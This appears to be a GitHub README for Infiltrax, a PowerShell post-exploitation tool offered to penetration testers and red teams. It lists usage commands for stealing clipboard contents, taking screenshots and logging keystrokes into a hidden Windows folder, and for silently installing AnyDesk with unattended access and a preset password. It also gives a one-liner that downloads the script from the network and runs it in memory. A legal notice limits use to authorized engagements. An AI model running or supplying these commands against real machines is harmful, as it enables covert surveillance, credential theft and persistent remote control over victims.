# Infiltrax
Infiltrax is a post-exploitation reconnaissance tool for penetration testers and red teams, designed to capture screenshots, retrieve clipboard contents, log keystrokes, and install AnyDesk for persistent remote access. 

## Features

- **Screenshot Capture**: Take screenshots of the entire screen and save them as PNG files.
- **Clipboard Retrieval**: Access the current clipboard contents.
- **Keystroke Logging**: Record keystrokes for a specified duration.
- **AnyDesk Installation**: Install and configure AnyDesk with unattended access.

## Usage
1. **Execute directly into memory**
```powershell
C:\Users\Administrator\Desktop> IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/alexdhital/Infiltrax/main/Infiltrax.ps1')
```
2. **Get Clipboard contents**
```powershell
C:\Users\Administrator\Desktop> Invoke-Clipboard
```
3. **Take desktop screenshot and save into certain location**
```powershell
C:\Users\Administrator\Desktop> Invoke-Screenshot -Path "C:\Windows\Tasks\"
```
4. **Capture user keystrokes and save in a file**
```powershell
C:\Users\Administrator\Desktop> Invoke-KeyStrokeCapture -DurationInSeconds 30 -OutputPath C:\Windows\Tasks\keystrokes.txt
```
5. **Installs anydesk silently, sets up unattended access and gets remote id** (Requires Administrative Privilege)
```powershell
C:\Users\Administrator\Desktop> Invoke-AnyDeskInstall -InstallPath "C:\Users\Alex\AppData\Local\AnyDesk" -Password "Unattended123!" 
```
## Warning and Legal Notice
This tool is intended solely for use by penetration testers and red team professionals during authorized engagements during post exploitation. Do not use this tool for unauthorized access or illegal activities.
